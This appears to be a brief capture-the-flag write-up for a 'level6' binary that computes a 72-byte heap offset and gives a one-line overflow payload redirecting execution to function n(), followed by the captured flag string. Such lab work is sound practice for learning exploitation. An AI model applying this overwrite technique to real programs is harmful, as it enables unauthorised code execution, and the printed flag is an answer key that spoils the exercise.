# level 6

There is an exec level6, we bring to local data.

## addresses

n()
    08048454

__dest malloc(64) and ppcVar1 malloc(4) so we have an offset of 68
strcpy is called with param_2 + 4 so we have to overflow after 72 bytes

    $ ./level6 $(python -c "print 'a' * 72 + '\x54\x84\x04\x08'")
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d